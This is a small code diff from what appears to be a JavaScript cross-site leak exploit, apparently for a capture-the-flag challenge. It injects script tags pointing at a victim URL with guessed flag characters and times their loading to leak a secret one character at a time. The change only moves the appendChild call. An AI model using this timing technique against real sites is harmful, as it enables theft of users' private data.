@@ -34,7 +34,7 @@
             // declaration du script
             let s = document.createElement('script')
             s.src = `${victime}${flag}${alpha[i]}`
-            document.body.appendChild(s)
+
 
             var start = performance.now()
 
@@ -51,6 +51,7 @@
                 }
 
             }
+            document.body.appendChild(s)
         }
         leak(victime, 0)
 
